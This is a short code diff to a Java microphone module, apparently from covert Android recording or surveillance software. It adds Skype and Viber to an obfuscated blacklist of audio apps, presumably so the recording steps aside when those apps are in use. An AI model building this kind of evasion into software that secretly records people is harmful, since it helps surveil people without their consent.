@@ -87,6 +87,8 @@ public abstract class ModuleMic extends BaseModule implements Observer<Call>, On
 		addBlacklist(M.e("voicerecorder"));
 		addBlacklist(M.e("voicesearch"));
 		addBlacklist(M.e("com.andrwq.recorder"));
+		addBlacklist(M.e("com.skype.raider"));
+		addBlacklist(M.e("com.viber.voip"));
 		if (android.os.Build.VERSION.SDK_INT > 20){
 			if(isSpeechRecognitionActivityPresented()){
 				addBlacklist(M.e("googlequicksearchbox:search"));
